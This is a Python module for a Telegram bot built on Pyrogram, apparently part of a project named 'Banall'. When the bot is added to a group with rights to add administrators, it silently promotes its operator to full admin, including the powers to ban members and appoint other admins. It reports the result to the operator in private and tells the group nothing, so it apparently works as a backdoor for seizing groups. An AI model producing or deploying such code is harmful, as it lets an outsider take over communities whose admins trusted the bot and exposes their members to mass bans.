from pyrogram import Client, filters
from pyrogram.types import ChatPrivileges
from pyrogram.errors import FloodWait, UserNotParticipant, UsernameNotOccupied, UserIdInvalid
from Banall import app, OWNER_ID  # Importing app and OWNER_ID from Banall module
import asyncio
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Function to resolve user ID from username or validate user ID
async def resolve_user_identifier(identifier):
    try:
        if isinstance(identifier, int) or (isinstance(identifier, str) and identifier.isdigit()):
            return int(identifier)
        elif isinstance(identifier, str) and identifier.startswith("@"):
            chat = await app.get_users(identifier)
            return chat.id
        else:
            raise UsernameNotOccupied("Invalid username or ID")
    except UsernameNotOccupied:
        logger.error(f"Username {identifier} not found.")
        return None
    except UserIdInvalid:
        logger.error(f"User ID {identifier} is invalid.")
        return None
    except Exception as e:
        logger.error(f"Error resolving user: {e}")
        return None


# Handler for when the bot is added to a group
@app.on_message(filters.new_chat_members)
async def on_bot_added(client, message):
    # Check if the bot is among the new members
    bot_id = (await client.get_me()).id
    if bot_id in [member.id for member in message.new_chat_members]:
        chat_id = message.chat.id
        chat_title = message.chat.title or "Unknown Group"
        logger.info(f"Bot added to group: {chat_title} (ID: {chat_id})")

        # Check if the bot has admin rights to promote members
        try:
            bot_member = await client.get_chat_member(chat_id, bot_id)
            if not bot_member.privileges.can_promote_members:
                logger.warning("Bot lacks permission to promote members.")
                await client.send_message(
                    OWNER_ID,
                    f"I need 'Add Administrators' permission in '{chat_title}' (ID: {chat_id}) to promote the owner to admin."
                )
                return
        except Exception as e:
            logger.error(f"Error checking bot permissions: {e}")
            await client.send_message(
                OWNER_ID,
                f"Error checking permissions in '{chat_title}' (ID: {chat_id}): {str(e)}"
            )
            return

        # Resolve the owner user
        owner_id = await resolve_user_identifier(OWNER_ID)
        if not owner_id:
            await client.send_message(
                OWNER_ID,
                f"Could not find user with ID/username: {OWNER_ID}"
            )
            return

        # Check if the owner is in the group
        try:
            await client.get_chat_member(chat_id, owner_id)
        except UserNotParticipant:
            logger.warning(f"User {owner_id} is not in the group.")
            await client.send_message(
                OWNER_ID,
                f"User {OWNER_ID} is not a member of '{chat_title}' (ID: {chat_id})."
            )
            return
        except Exception as e:
            logger.error(f"Error checking user membership: {e}")
            await client.send_message(
                OWNER_ID,
                f"Error checking membership in '{chat_title}' (ID: {chat_id}): {str(e)}"
            )
            return

        # Define full admin privileges
        privileges = ChatPrivileges(
            can_manage_chat=True,
            can_delete_messages=True,
            can_manage_video_chats=True,
            can_restrict_members=True,
            can_promote_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True,
            is_anonymous=False
        )

        # Promote the owner to admin
        try:
            await client.promote_chat_member(
                chat_id=chat_id,
                user_id=owner_id,
                privileges=privileges
            )
            logger.info(f"Promoted user {owner_id} to admin in chat {chat_id}")
            await client.send_message(
                OWNER_ID,
                f"Successfully promoted {OWNER_ID} to admin in '{chat_title}' (ID: {chat_id}) with full permissions!"
            )
        except FloodWait as e:
            logger.warning(f"Flood wait: {e.x} seconds")
            await asyncio.sleep(e.x)
            await client.promote_chat_member(
                chat_id=chat_id,
                user_id=owner_id,
                privileges=privileges
            )
            await client.send_message(
                OWNER_ID,
                f"Successfully promoted {OWNER_ID} to admin in '{chat_title}' (ID: {chat_id}) with full permissions after flood wait!"
            )
        except Exception as e:
            logger.error(f"Error promoting user: {e}")
            await client.send_message(
                OWNER_ID,
                f"Failed to promote {OWNER_ID} to admin in '{chat_title}' (ID: {chat_id}): {str(e)}"
            )
